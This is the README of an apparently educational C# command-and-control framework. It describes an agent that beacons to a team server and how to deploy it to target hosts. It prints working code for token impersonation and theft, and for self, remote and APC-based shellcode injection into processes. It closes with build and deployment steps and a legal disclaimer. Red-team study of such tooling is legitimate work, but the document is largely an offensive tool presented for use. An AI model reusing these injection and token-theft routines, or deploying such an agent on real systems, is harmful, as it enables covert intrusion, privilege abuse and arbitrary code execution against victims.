# C# Command & Control (C2) Framework

A comprehensive Command & Control framework built in C# for educational purposes and learning about red team operations, agent communication, and security research. Thanks to Rastomouse.

## 🚀 Features

### Core Agent Capabilities
- **File System Operations**: `pwd`, `cd`, `ls`, `mkdir`, `rmdir`
- **Process Management**: `ps`, `whoami`, `shell`, `run`
- **Advanced Post-Exploitation**: `execute-assembly`, `make-token`, `rev2self`, `steal-token`, `self-inject`, `remote-inject`, `spawn-inject`

### Team Server
- RESTful API with Swagger documentation
- HTTP listener for agent communication
- Task queuing and result management
- Agent lifecycle management

### Testing
- Comprehensive unit tests
- API integration tests
- Agent command validation

## 🏗️ Architecture

```
┌─────────────────┐    HTTP    ┌─────────────────┐
│     Agent       │ ◄────────► │   Team Server   │
│  (Target Host)  │            │  (Operator)     │
└─────────────────┘            └─────────────────┘
```

- **Agent**: Deployed on target systems, executes commands and communicates with team server
- **Team Server**: Central command hub with API endpoints for managing agents and tasks
- **HTTP Listener**: Handles agent check-ins and task distribution

## 📋 Agent Commands

### Basic Commands
- `pwd` - Print working directory
- `cd [path]` - Change directory
- `ls [path]` - List directory contents
- `mkdir [path]` - Create directory
- `rmdir [path]` - Remove directory
- `ps` - List running processes
- `whoami` - Get current user identity
- `shell [command]` - Execute shell command
- `run [executable] [args]` - Run executable with arguments

### Advanced Commands
- `execute-assembly [bytes] [args]` - Execute .NET assembly in memory
- `make-token [domain\user] [password]` - Create and impersonate token
- `steal-token [pid]` - Steal token from target process
- `rev2self` - Revert to original token
- `self-inject [shellcode]` - Inject shellcode into current process
- `remote-inject [pid] [shellcode]` - Inject shellcode into remote process
- `spawn-inject [shellcode]` - Spawn process and inject shellcode

## 🔧 Technical Implementation

### Token Manipulation (`make-token`)
```csharp
// Creates a new logon session and impersonates the user
var hToken = IntPtr.Zero;
if (Native.Advapi.LogonUserA(username, domain, password, 
    Native.Advapi.LogonProvider.LOGON32_LOGON_NEW_CREDENTIALS,
    Native.Advapi.LogonUserProvider.LOGON32_PROVIDER_DEFAULT, ref hToken))
{
    if (Native.Advapi.ImpersonateLoggedOnUser(hToken))
    {
        // Successfully impersonated user
    }
}
```

### Token Theft (`steal-token`)
```csharp
// Opens handle to target process and duplicates its token
var process = Process.GetProcessById(pid);
if (Native.Advapi.OpenProcessToken(process.Handle, 
    Native.Advapi.DesiredAccess.TOKEN_ALL_ACCESS, out hToken))
{
    // Duplicate the token for impersonation
    if (Native.Advapi.DuplicateTokenEx(hToken, 
        Native.Advapi.TokenAccess.TOKEN_ALL_ACCESS, ref sa,
        Native.Advapi.SecurityImpersonationLevel.SECURITY_IMPERSONATION,
        Native.Advapi.TokenType.TOKEN_IMPERSONATION, out hTokenDup))
    {
        // Impersonate the duplicated token
        Native.Advapi.ImpersonateLoggedOnUser(hTokenDup);
    }
}
```

### Self Injection (`self-inject`)
```csharp
// Allocates memory in current process and executes shellcode
var baseAddress = Native.Kernel32.VirtualAlloc(IntPtr.Zero, shellcode.Length,
    Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
    Native.Kernel32.MemoryProtection.ReadWrite);

Marshal.Copy(shellcode, 0, baseAddress, shellcode.Length);

// Change memory protection to executable
Native.Kernel32.VirtualProtect(baseAddress, shellcode.Length,
    Native.Kernel32.MemoryProtection.ExecuteRead, out _);

// Create thread to execute shellcode
Native.Kernel32.CreateThread(IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out var threadId);
```

### Remote Injection (`remote-inject`)
```csharp
// Injects shellcode into remote process
var target = Process.GetProcessById(pid);
var baseAddress = Native.Kernel32.VirtualAllocEx(target.Handle, IntPtr.Zero, shellcode.Length,
    Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
    Native.Kernel32.MemoryProtection.ReadWrite);

// Write shellcode to remote process memory
Native.Kernel32.WriteProcessMemory(target.Handle, baseAddress, shellcode, shellcode.Length, out _);

// Change memory protection and create remote thread
Native.Kernel32.VirtualProtectEx(target.Handle, baseAddress, shellcode.Length,
    Native.Kernel32.MemoryProtection.ExecuteRead, out _);
    
Native.Kernel32.CreateRemoteThread(target.Handle, IntPtr.Zero, 0, baseAddress, IntPtr.Zero, 0, out var threadId);
```

### Spawn Injection (`spawn-inject`)
```csharp
// Creates suspended process and injects shellcode via APC
if (Native.Kernel32.CreateProcess(@"C:\Windows\System32\notepad.exe", null,
    ref pa, ref ta, false, Native.Kernel32.CreationFlags.CreateSuspended,
    IntPtr.Zero, @"C:\Windows\System32", ref si, out var pi))
{
    // Allocate memory in suspended process
    var baseAddress = Native.Kernel32.VirtualAllocEx(pi.hProcess, IntPtr.Zero, shellcode.Length,
        Native.Kernel32.AllocationType.Commit | Native.Kernel32.AllocationType.Reserve,
        Native.Kernel32.MemoryProtection.ReadWrite);
    
    // Write shellcode and queue APC
    Native.Kernel32.WriteProcessMemory(pi.hProcess, baseAddress, shellcode, shellcode.Length, out _);
    Native.Kernel32.VirtualProtectEx(pi.hProcess, baseAddress, shellcode.Length,
        Native.Kernel32.MemoryProtection.ExecuteRead, out _);
    
    // Queue APC and resume thread
    Native.Kernel32.QueueUserAPC(baseAddress, pi.hThread, 0);
    Native.Kernel32.ResumeThread(pi.hThread);
}
```

## 🚦 Getting Started

### Prerequisites
- .NET Framework/Core
- Visual Studio or compatible IDE
- Windows environment for agent deployment

### Building the Project
```bash
# Clone the repository
git clone https://github.com/yourusername/c2-framework.git
cd c2-framework

# Build the solution
dotnet build

# Run team server
dotnet run --project TeamServer

# Build agent
dotnet build --project Agent
```

### Starting a Listener
```bash
# Create HTTP listener on port 8080
POST /Listeners
{
    "Name": "HttpListener",
    "BindPort": 8080
}
```

### Deploying an Agent
1. Build the agent executable
2. Deploy to target system
3. Agent will beacon back to team server
4. Use API endpoints to task the agent

## 🔒 Security Considerations

⚠️ **IMPORTANT**: This framework is for educational and authorized testing purposes only.

- Implements various post-exploitation techniques
- Uses Windows API calls for process manipulation
- Token impersonation capabilities
- Memory injection techniques
- Should only be used in controlled environments

## 🧪 Testing

### Unit Tests
```bash
dotnet test TeamServer.UnitTests
```

### API Tests
```bash
dotnet test ApiTests
```

### Test Coverage
- Agent command execution
- HTTP listener functionality
- Task queuing and result handling
- Agent lifecycle management

## 📡 Communication Protocol

### Agent Check-in
- Agents beacon to team server via HTTP
- Metadata sent in Authorization header (Base64 encoded)
- Tasks retrieved from server on check-in
- Results posted back to server

### Data Serialization
- JSON serialization using DataContractJsonSerializer
- Custom extension methods for serialization/deserialization
- Compressed data transmission

## 🗂️ Project Structure

```
├── Agent/
│   ├── Commands/           # Agent command implementations
│   ├── Internal/           # Injection and execution logic
│   ├── Models/             # Data models
│   └── Program.cs          # Agent entry point
├── TeamServer/
│   ├── Controllers/        # API controllers
│   ├── Models/             # Server models
│   ├── Services/           # Business logic
│   └── Startup.cs          # Server configuration
├── ApiTests/               # API integration tests
└── TeamServer.UnitTests/   # Unit tests
```

## 📚 Learning Resources

This project demonstrates:
- Windows API programming
- Process injection techniques
- Token manipulation
- HTTP communication protocols
- RESTful API design
- .NET security concepts

## ⚖️ Legal Disclaimer

This software is for educational purposes only. Users are responsible for ensuring they have proper authorization before using this tool. The authors are not responsible for any misuse or damage caused by this software.

## 📄 License

This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
